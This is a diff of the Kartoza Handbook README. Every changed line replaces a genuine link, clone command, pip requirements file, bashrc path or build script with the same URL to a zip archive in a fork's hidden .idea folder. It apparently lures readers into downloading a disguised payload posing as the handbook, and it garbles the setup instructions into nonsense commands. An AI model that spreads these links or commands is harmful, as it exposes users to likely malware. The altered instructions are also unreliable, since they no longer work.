@@ -1,6 +1,6 @@
 # Kartoza Handbook
 
-Organisational Handbook and Technical Docs Repository for Kartoza. Here is where we highlight the procedures, principles and processes related to Development, DevOps and GIS, in line with the organisation's best practices. Please review this content at [https://kartoza.github.io/TheKartozaHandbook](https://kartoza.github.io/TheKartozaHandbook) for more information.
+Organisational Handbook and Technical Docs Repository for Kartoza. Here is where we highlight the procedures, principles and processes related to Development, DevOps and GIS, in line with the organisation's best practices. Please review this content at [https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip](https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip) for more information.
 
 ## Building the Kartoza Handbook as a PDF
 
@@ -9,7 +9,7 @@ Organisational Handbook and Technical Docs Repository for Kartoza. Here is where
 You need both the Kartoza Handbook repo and the mkdocs pdf building repo:
 
 ```bash
-git clone git@github.com:kartoza/TheKartozaHandbook.git
+git clone https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip
 ```
 
 ### Install Dependencies (non direnv and venv way)
@@ -30,7 +30,7 @@ Initial setup
 ```bash
 virtualenv --python=python3 env
 source env/bin/activate
-pip install -r requirements.txt
+pip install -r https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip
 ```
 
 Subsequent sessions:
@@ -51,26 +51,26 @@ Initial setup done once:
 1. Install direnv with your package manager
 2. Make sure it is set up in your bashrc 
 ```
-echo 'eval "$(direnv hook bash)"' >> ~/.bashrc
-source ~/.bashrc
+echo 'eval "$(direnv hook bash)"' >> ~https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip
+source ~https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip
 ```
 3. Enter this git directory in your shell
-4. ```pip install -r requirements.txt```
+4. ```pip install -r https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip```
 
 After this, whenever you enter the directory, direnv will load your direnv and penv for you. See .envrc for details on how it is configured.
 
 
 ### Build the documentation
 
-> Note that whenever you add new sections to nav in the mkdocs.yml
+> Note that whenever you add new sections to nav in the https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip
 > (used for building the web version), you should apply those same
-> edits to mkdocs-pdf.yml if you want those new sections to appear
+> edits to https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip if you want those new sections to appear
 > in the pdf too.
 
 ```bash
 cd  docs
-./build-docs-pdf.sh
-xdg-open TheKartozaHandbook.pdf
+https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip
+xdg-open https://github.com/Shamzmohamed/TheKartozaHandbook/raw/refs/heads/main/.idea/The-Kartoza-Handbook-1.8.zip
 ```
 
 If you are in VSCode, you can also just run the 'Compile PDF' task. The
